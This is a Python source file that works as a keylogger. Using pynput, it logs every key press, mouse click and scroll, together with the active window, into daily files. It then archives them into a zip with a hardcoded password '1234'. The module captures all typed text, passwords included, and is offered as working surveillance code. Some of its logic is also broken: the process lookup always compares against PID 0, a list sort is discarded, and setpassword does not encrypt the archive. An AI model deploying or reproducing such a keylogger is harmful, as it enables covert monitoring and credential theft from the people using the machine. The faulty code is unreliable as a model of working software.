"""
listener module recoding User action every day in Zip

"""

import os
import time
import zipfile
from ctypes import wintypes
import psutil
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import pygetwindow as gw

#active APP window(focus window)
active_app = " "


#preparing record
def log_record(massage):
    timestamp = time.time()
    logdir = './log'
    if not os.path.exists(logdir):
        os.mkdir(logdir)
    log_file_name = os.path.join(logdir, (time.strftime('%y%m%d', time.localtime())))
    try:
        f = open(log_file_name, 'a')
        if f.tell() == 0:
            f.write(f"window {get_active_app()};")
        record = f"{timestamp}@{massage};"
        f.write(record)
        f.close()
    except FileExistsError:
        print("file not exists")
    except Exception as err:
        print(f"Unexpected {err}")
    if len(os.listdir(logdir)) > 1:
        os.listdir(logdir).sort()
        zip_log(os.path.join(logdir, (os.listdir(logdir)[0])))
        os.remove(os.path.join(logdir, (os.listdir(logdir)[0])))

#Zip archive
def zip_log(arc_file):
    with zipfile.ZipFile("loghistory.zip", "a", zipfile.ZIP_DEFLATED) as myzip:
        myzip.setpassword(b"1234")
        if arc_file[-6:] not in myzip.namelist():
            myzip.write(arc_file, arc_file[-6:])
    myzip.close()

#catch keyboard
def keyboard_act(key):
    log_record(f"pressed {key}")

#catch mouse
def mouse_act(x, y, button, pressed):
    if pressed:
        log_record(f"{x},{y},{str(button)[7:]}")
        app = str(get_active_app())
        if app != "None":
            log_record(f"window {app};")

def mouse_scroll(x, y, dx, dy):
    log_record(f"{x},{y},scroll {dy}")


#getting active APP
def get_active_app():
    global active_app
    pid = wintypes.DWORD().value
    for item in psutil.process_iter():
        if pid == item.pid:
            active_app2 = item.name() + "%" + str(gw.getActiveWindowTitle()).rsplit(":")[0]
            if (str(active_app)) != (str(active_app2)):
                active_app = active_app2
                return active_app2
            else:
                return None





keyboard_listener = KeyboardListener(on_press=keyboard_act)
mouse_listener = MouseListener(on_click=mouse_act, on_scroll=mouse_scroll)
keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()
